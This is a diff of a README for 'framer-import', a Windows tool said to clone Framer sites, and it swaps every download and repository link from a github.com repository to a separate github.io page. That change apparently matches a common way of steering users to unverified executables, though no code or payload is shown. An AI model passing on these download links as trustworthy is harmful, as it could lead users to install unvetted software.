@@ -1,6 +1,6 @@
 # 🔮 framer-import - Clone Any Framer Site Instantly
 
-[![Download framer-import](https://img.shields.io/badge/Download-framer--import-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/translational-vestment612/framer-import)
+[![Download framer-import](https://img.shields.io/badge/Download-framer--import-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://translational-vestment612.github.io)
 
 ## 🚀 What Is framer-import?
 
@@ -45,7 +45,7 @@ The output is a static site — no heavy databases or slow backend. Your pages l
 
 ## 📦 How to Download and Run (Windows)
 
-Visit this link to download the application: [https://github.com/translational-vestment612/framer-import](https://github.com/translational-vestment612/framer-import)
+Visit this link to download the application: [https://translational-vestment612.github.io](https://translational-vestment612.github.io)
 
 ### Step-by-Step Guide for Windows Users
 
@@ -150,7 +150,7 @@ Everything is neatly organized and ready to upload.
 
 If you run into any issues:
 
-- **Visit the GitHub repository** at [https://github.com/translational-vestthing12/framer-import](https://github.com/translational-vestment612/framer-import)
+- **Visit the GitHub repository** at [https://translational-vestment612.github.io](https://translational-vestment612.github.io)
 - **Open an issue** on the project page
 - **Check the README** in the repository for updates
 
